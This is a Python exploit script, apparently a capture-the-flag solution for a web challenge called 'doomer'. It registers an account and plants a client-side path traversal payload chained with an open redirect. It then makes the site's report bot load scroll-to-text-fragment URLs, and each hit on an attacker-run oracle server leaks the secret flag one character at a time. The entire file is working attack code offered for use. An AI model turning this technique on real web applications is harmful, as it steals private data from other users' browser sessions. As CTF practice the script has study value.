from urllib.parse import quote
import httpx 
import random 
import string 
import time 

def generate_random_creds() -> str:
    username = "".join(random.choices(string.ascii_letters + string.digits, k=8)) 
    password = "".join(random.choices(string.ascii_letters + string.digits, k=8))

    return username, password

def register(client: httpx.Client) -> [str, str]:
    username, password = generate_random_creds()
    data = {
        "username": username,
        "email": f"{username}@gmail.com",
        "password": password,
        "confirm_password": password
    }
    response = client.post("/register", data=data)

    assert response.status_code == 302, "[-] Failed to register."

    return username, password

def login(client: httpx.Client, username: str, password: str) -> None:
    data = {
        "username": username,
        "password": password
    }
    response = client.post("/login", data=data)

    assert response.status_code == 302, "[-] Failed to login."

def report(client: httpx.Client, url: str) -> None:
    data = {
        "url": url,
    }
    response = client.post("/api/report", json=data)
    assert response.status_code == 200, f"[-] Failed to execute make the report for payload: {url}"

def CSPT_Gadget(client: httpx.Client, username: str, ORACLE_SERVER_URL: str) -> None:
    padding = "<ul>" + "<li>" * 300 + "</ul>" # move the lazy-loaded iframe outside user viewport
    CSPT_payload = f"../login?redirect={quote(ORACLE_SERVER_URL)}/hit%3Flol.gif"  # chain the CSPT with an Open Redirect to hit our exploit server
    payload = {
        "content": padding,
        "gifUrl": CSPT_payload
    }

    response = client.post(f"/users/@{username}/post", json=payload)
    assert response.status_code == 200, "[-] Failed to execute trigger the CSPT Gadget."

def Oracle(client: httpx.Client, ORACLE_SERVER_URL: str) -> bool:
    oracle = client.get(f"{ORACLE_SERVER_URL}/poll").text
    return bool(int(oracle))

def STTF_Gadget(client: httpx.Client, username: str, REPORT_SERVER_URL: str, ORACLE_SERVER_URL: str) -> None:
    charset = string.ascii_lowercase + "}"
    current_flag = "SCC{"
    current_index = 0

    while True:
        if current_index >= len(charset):
            print("[*] Finished exfiltrating the flag.")
            print("[+] Flag: " + current_flag)
            break

        char = charset[current_index] 
        payload = f"{REPORT_SERVER_URL}/users/@{username}#:~:text={current_flag[-1]}-,{char}"

        report(client, payload)
        time.sleep(2.5) 

        print("Trying: " + current_flag + char)
        if Oracle(client, ORACLE_SERVER_URL):
            current_flag += char
            current_index = 0
            print(f"[+] Exfiled character: {char}")
        else:
            current_index += 1
    
def exploit():
    BASE_URL = "http://doomer.quals.scc2025.ctf.rs:1337"
    ORACLE_SERVER_URL = "http://<VPS_IP>:9999"
    REPORT_SERVER_URL = "http://web:1337"

    client = httpx.Client(
        base_url=BASE_URL,
        verify=False,
        timeout=10
    )

    username, password = register(client)
    login(client, username, password)
    print("[+] Successfully registered and logged in.")

    CSPT_Gadget(client, username, ORACLE_SERVER_URL)
    print("[+] Successfully triggered the CSPT Gadget.")

    print("[+] Triggering the STTF Gadget...")
    STTF_Gadget(client, username, REPORT_SERVER_URL, ORACLE_SERVER_URL) 

if __name__ == "__main__":
    exploit()